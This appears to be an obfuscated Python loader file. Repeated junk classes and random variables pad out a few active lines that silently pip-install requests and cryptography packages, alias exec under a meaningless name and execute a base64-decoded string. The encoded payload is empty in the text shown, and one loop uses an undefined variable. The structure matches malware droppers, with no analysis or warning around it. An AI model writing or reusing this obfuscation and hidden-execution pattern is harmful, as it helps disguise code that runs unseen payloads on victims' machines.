

from sys import executable, stderr
oRFn4o9ZZI = 28988177
class pYCQz8vSqb:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class UM4NAeLvbn:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class jctvTzqPkn:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class KWFJuTqyhd:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
OzaEODH7RG = 14069335
'Bnf4VJdPzl'
zF8GTSPeil = 33504282
class SxjrUoJ4UV:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
inaKpjgnAn = 59331860
sKgOKaJ80E = 19349522
MWxFMLUz71 = 53235673
["'Dj7bFPhTUt'", "'pxdWHuuN2O'", "'kORFMrmsYg'"]
BTlvEgoHXA = 80427500
class AbYNpHdzJS:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
xQCb4QRre7 = 18218975
{'username': 'jK8GYZU', 'age': 73}
mjszzIFVYQ = 72043672
class MuKkQscP5M:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
JzT6vXI4au = 93479895
class l0QvWXsn1F:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class EWTafz4KgP:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class ggukhu6Leu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
oRFn4o9ZZI = 28988177
class pYCQz8vSqb:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class UM4NAeLvbn:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class jctvTzqPkn:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class KWFJuTqyhd:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
OzaEODH7RG = 14069335
'Bnf4VJdPzl'
zF8GTSPeil = 33504282
class SxjrUoJ4UV:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
inaKpjgnAn = 59331860
sKgOKaJ80E = 19349522
MWxFMLUz71 = 53235673
["'Dj7bFPhTUt'", "'pxdWHuuN2O'", "'kORFMrmsYg'"]
BTlvEgoHXA = 80427500
class AbYNpHdzJS:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
xQCb4QRre7 = 18218975
{'username': 'jK8GYZU', 'age': 73}
mjszzIFVYQ = 72043672
class MuKkQscP5M:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
JzT6vXI4au = 93479895
class l0QvWXsn1F:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class EWTafz4KgP:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class ggukhu6Leu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
kAPndPoQxtBit6MlzzyJGvNaL3THMYQHuygVuC = exec
oRFn4o9ZZI = 28988177
class pYCQz8vSqb:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class UM4NAeLvbn:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class jctvTzqPkn:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class KWFJuTqyhd:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
OzaEODH7RG = 14069335
'Bnf4VJdPzl'
zF8GTSPeil = 33504282
class SxjrUoJ4UV:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
inaKpjgnAn = 59331860
sKgOKaJ80E = 19349522
MWxFMLUz71 = 53235673
["'Dj7bFPhTUt'", "'pxdWHuuN2O'", "'kORFMrmsYg'"]
BTlvEgoHXA = 80427500
class AbYNpHdzJS:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
xQCb4QRre7 = 18218975
{'username': 'jK8GYZU', 'age': 73}
mjszzIFVYQ = 72043672
class MuKkQscP5M:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
JzT6vXI4au = 93479895
class l0QvWXsn1F:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class EWTafz4KgP:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class ggukhu6Leu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
import concurrent.futures
XMgHiZiRy2aHjzIAqUi0zjqZCIuHfAwtamJLew=""
kAPndPoQxtBit6MlzzyJGvNaL3THMYQHuygVuC(base64.b64decode(XMgHiZiRy2aHjzIAqUi0zjqZCIuHfAwtamJLew))
oRFn4o9ZZI = 28988177
class pYCQz8vSqb:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class UM4NAeLvbn:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class jctvTzqPkn:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class KWFJuTqyhd:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
OzaEODH7RG = 14069335
'Bnf4VJdPzl'
zF8GTSPeil = 33504282
class SxjrUoJ4UV:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
inaKpjgnAn = 59331860
sKgOKaJ80E = 19349522
MWxFMLUz71 = 53235673
["'Dj7bFPhTUt'", "'pxdWHuuN2O'", "'kORFMrmsYg'"]
BTlvEgoHXA = 80427500
class AbYNpHdzJS:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
xQCb4QRre7 = 18218975
{'username': 'jK8GYZU', 'age': 73}
mjszzIFVYQ = 72043672
class MuKkQscP5M:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
JzT6vXI4au = 93479895
class l0QvWXsn1F:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class EWTafz4KgP:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class ggukhu6Leu:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data